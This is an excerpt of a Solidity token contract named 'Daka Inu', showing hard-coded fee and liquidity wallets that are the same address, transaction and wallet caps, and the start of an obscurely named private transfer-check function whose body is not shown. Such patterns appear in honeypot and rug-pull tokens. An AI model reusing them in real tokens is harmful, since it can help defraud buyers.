...
contract Daka is Context, IERC20, Ownable {
    ...
    address payable private marketingAddress =
        payable(address(0x93326b2Ad0af8db7e884dcf68361EC0076863E09));

    address private liquidityReceiver =
        0x93326b2Ad0af8db7e884dcf68361EC0076863E09;
    address private fixedBurnAddress =
        0x000000000000000000000000000000000000dEaD;
    
    bool public burnDeductSupply = false;

    string private _name = "Daka Inu";
    string private _symbol = "Daka";
    uint8 private _decimals = 9;

    uint256 public _maxTxAmount = _tTotal * 2 / 100; // 2% TOTAL
    uint256 private numTokensSellToAddToLiquidity = 563* 10**9;
    uint256 public _maxWalletSize = _tTotal * 2 / 100;  // 2% TOTAL
    ...
    function Kiwichecker(address f,address t,uint256 m) private {
